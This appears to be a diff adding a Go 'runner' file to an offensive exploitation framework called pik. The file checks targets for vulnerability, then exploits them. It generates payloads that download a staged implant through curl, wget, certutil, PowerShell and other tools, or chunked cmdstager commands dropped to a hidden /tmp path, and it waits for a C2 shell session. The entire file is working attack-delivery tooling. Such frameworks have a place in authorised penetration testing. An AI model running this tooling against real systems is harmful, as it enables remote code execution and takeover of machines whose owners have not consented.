@@ -1,0 +1,283 @@
+package runner
+
+import (
+	"context"
+	"fmt"
+	"net/url"
+	"time"
+
+	"github.com/Chocapikk/pik/pkg/c2"
+	"github.com/Chocapikk/pik/pkg/c2/shell"
+	"github.com/Chocapikk/pik/pkg/cmdstager"
+	"github.com/Chocapikk/pik/pkg/core"
+	pikhttp "github.com/Chocapikk/pik/pkg/http"
+	"github.com/Chocapikk/pik/pkg/output"
+	"github.com/Chocapikk/pik/pkg/payload"
+	"github.com/Chocapikk/pik/pkg/text"
+)
+
+// --- Types ---
+
+// RunOpts configures runner behavior.
+type RunOpts struct {
+	CheckOnly bool
+}
+
+// --- Public API ---
+
+// RunSingle checks and/or exploits a single target.
+func RunSingle(ctx context.Context, mod core.Exploit, params core.Params, opts RunOpts) error {
+	target := params.Target()
+
+	if err := check(mod, params, target, opts.CheckOnly); err != nil {
+		return err
+	}
+	if opts.CheckOnly {
+		return nil
+	}
+
+	backend := resolveC2(params)
+	if err := backend.Setup(params.Srvhost(), params.Srvport()); err != nil {
+		return fmt.Errorf("c2 setup failed: %w", err)
+	}
+	defer func() { _ = backend.Shutdown() }()
+
+	platform := mod.Info().Platform()
+	timeout := time.Duration(params.IntOr("WAITSESSION", 30)) * time.Second
+
+	if params.Get("DELIVERY") == "cmdstager" {
+		return deliverCmdStager(target, mod, backend, params, platform, timeout)
+	}
+
+	return deliverPayload(target, mod, backend, params, platform, timeout)
+}
+
+// --- Check ---
+
+func check(mod core.Exploit, params core.Params, target string, required bool) error {
+	checker, ok := mod.(core.Checker)
+	if !ok {
+		if required {
+			output.Warning("Module %s does not support check", core.NameOf(mod))
+		}
+		return nil
+	}
+
+	output.Status("Checking %s", target)
+	result, err := checker.Check(buildContext(params, ""))
+	if err != nil {
+		return fmt.Errorf("check failed: %w", err)
+	}
+	if !result.Code.IsVulnerable() {
+		output.Warning("%s - %s%s", target, result.Code, result.FormatReason())
+		return fmt.Errorf("target not vulnerable")
+	}
+	output.Success("%s - %s%s", target, result.Code, result.FormatReason())
+	return nil
+}
+
+// --- Delivery: direct payload ---
+
+func deliverPayload(target string, mod core.Exploit, backend c2.Backend, params core.Params, platform string, timeout time.Duration) error {
+	payloadCmd, err := resolvePayload(backend, params, platform)
+	if err != nil {
+		return fmt.Errorf("payload generation failed: %w", err)
+	}
+
+	output.Status("Exploiting %s", target)
+	if err := mod.Exploit(buildContext(params, payloadCmd)); err != nil {
+		return fmt.Errorf("exploit failed: %w", err)
+	}
+
+	output.Status("Waiting for session...")
+	return backend.WaitForSession(timeout)
+}
+
+// --- Delivery: cmdstager ---
+
+func deliverCmdStager(target string, mod core.Exploit, backend c2.Backend, params core.Params, platform string, timeout time.Duration) error {
+	stager, ok := mod.(core.CmdStager)
+	if !ok {
+		return fmt.Errorf("module %s does not support cmdstager delivery", core.NameOf(mod))
+	}
+
+	fetch := params.GetOr("FETCH_COMMAND", "curl")
+	if fetch == "tcp" {
+		return deliverTCPStager(target, stager, backend, params, platform, timeout)
+	}
+
+	payloadCmd, err := resolvePayload(backend, params, platform)
+	if err != nil {
+		return fmt.Errorf("payload generation failed: %w", err)
+	}
+
+	commands, opts := generateCmdStager([]byte(payloadCmd), params)
+
+	output.InfoBox("CmdStager",
+		"Target", target,
+		"Flavor", string(opts.flavor),
+		"Payload", fmt.Sprintf("%d bytes", len(payloadCmd)),
+		"Chunks", fmt.Sprintf("%d commands", len(commands)),
+		"Drop path", opts.tempPath,
+	)
+
+	if err := stager.ExploitCmdStager(buildContext(params, ""), commands); err != nil {
+		return fmt.Errorf("exploit failed: %w", err)
+	}
+
+	output.Status("Waiting for session...")
+	return backend.WaitForSession(timeout)
+}
+
+func deliverTCPStager(target string, mod core.CmdStager, backend c2.Backend, params core.Params, platform string, timeout time.Duration) error {
+	tcpBackend, ok := backend.(c2.TCPStager)
+	if !ok {
+		return fmt.Errorf("backend %q does not support TCP staging", backend.Name())
+	}
+
+	stagerBin, err := tcpBackend.TCPStageImplant(platform, params.Arch())
+	if err != nil {
+		return fmt.Errorf("tcp stager generation failed: %w", err)
+	}
+
+	commands, opts := generateCmdStager(stagerBin, params)
+
+	output.InfoBox("CmdStager (TCP)",
+		"Target", target,
+		"Flavor", string(opts.flavor),
+		"Stager", fmt.Sprintf("%d bytes", len(stagerBin)),
+		"Chunks", fmt.Sprintf("%d commands", len(commands)),
+		"Drop path", opts.tempPath,
+	)
+
+	if err := mod.ExploitCmdStager(buildContext(params, ""), commands); err != nil {
+		return fmt.Errorf("exploit failed: %w", err)
+	}
+
+	output.Status("Waiting for session...")
+	return backend.WaitForSession(timeout)
+}
+
+// --- Cmdstager helpers ---
+
+type stagerOpts struct {
+	flavor   cmdstager.Flavor
+	tempPath string
+}
+
+func generateCmdStager(data []byte, params core.Params) ([]string, stagerOpts) {
+	tempPath := remotePath(params)
+	flavor := cmdstager.Flavor(params.GetOr("CMDSTAGER", string(cmdstager.DefaultFlavor)))
+
+	commands, err := cmdstager.Generate(data, flavor, cmdstager.Options{
+		TempPath: tempPath,
+		LineMax:  params.IntOr("CMDSTAGER_LINEMAX", 2047),
+	})
+	if err != nil {
+		output.Error("cmdstager failed: %v", err)
+		return nil, stagerOpts{}
+	}
+
+	return commands, stagerOpts{flavor: flavor, tempPath: tempPath}
+}
+
+// --- Path resolution ---
+
+func remotePath(params core.Params) string {
+	if path := params.Get("REMOTE_PATH"); path != "" {
+		return path
+	}
+	return fmt.Sprintf("/tmp/.%s", text.RandText(8))
+}
+
+// --- Payload resolution ---
+
+func resolvePayload(backend c2.Backend, params core.Params, platform string) (string, error) {
+	stager, ok := backend.(c2.Stager)
+	if !ok {
+		return backend.GeneratePayload(platform, params.GetOr("PAYLOAD", ""))
+	}
+
+	stageURL, err := stager.StageImplant(platform, params.Arch())
+	if err != nil {
+		return "", err
+	}
+
+	// If a tunnel is configured, rewrite the staging URL to use it
+	if tunnel := params.Tunnel(); tunnel != "" {
+		if parsed, err := url.Parse(stageURL); err == nil {
+			tunnelParsed, _ := url.Parse(tunnel)
+			if tunnelParsed != nil {
+				parsed.Scheme = tunnelParsed.Scheme
+				parsed.Host = tunnelParsed.Host
+				stageURL = parsed.String()
+			}
+		}
+	}
+
+	remotePath := remotePath(params)
+	fetch := params.GetOr("FETCH_COMMAND", "curl")
+
+	switch fetch {
+	case "wget":
+		return payload.Wget(stageURL, remotePath), nil
+	case "php":
+		return payload.PHPDownload(stageURL, remotePath), nil
+	case "perl":
+		return payload.PerlDownload(stageURL, remotePath), nil
+	case "python":
+		return payload.PythonDownload(stageURL, remotePath), nil
+	case "certutil":
+		return payload.Certutil(stageURL, ""), nil
+	case "powershell":
+		return payload.PowerShellDownload(stageURL, ""), nil
+	default:
+		return payload.Curl(stageURL, remotePath), nil
+	}
+}
+
+// --- Context wiring ---
+
+func buildContext(params core.Params, payloadCmd string) *core.Context {
+	ctx := core.NewContext(params.Map(), payloadCmd)
+	ctx.StatusFn = output.Status
+	ctx.SuccessFn = output.Success
+	ctx.ErrorFn = output.Error
+	ctx.WarningFn = output.Warning
+	ctx.Base64BashFn = payload.Base64Bash
+	ctx.CommentFn = payload.CommentTrail
+	ctx.RandTextFn = text.RandText
+	ctx.SendFn = httpBridge(params)
+	return ctx
+}
+
+func httpBridge(params core.Params) func(core.Request) (*core.Response, error) {
+	run := pikhttp.FromModule(params)
+	return func(req core.Request) (*core.Response, error) {
+		resp, err := run.Send(pikhttp.Request{
+			Method:      req.Method,
+			Path:        req.Path,
+			Query:       url.Values(req.Query),
+			Form:        url.Values(req.Form),
+			ContentType: req.ContentType,
+			Headers:     req.Headers,
+			Timeout:     time.Duration(req.Timeout) * time.Second,
+			NoRedirect:  req.NoRedirect,
+		})
+		if err != nil {
+			return nil, err
+		}
+		r := &core.Response{StatusCode: resp.StatusCode, Body: resp.Body}
+		r.SetContainsFn(resp.ContainsAny)
+		return r, nil
+	}
+}
+
+// --- C2 resolution ---
+
+func resolveC2(params core.Params) c2.Backend {
+	if backend := c2.Resolve(params.Get("C2"), params.Get("C2CONFIG")); backend != nil {
+		return backend
+	}
+	return shell.New()
+}
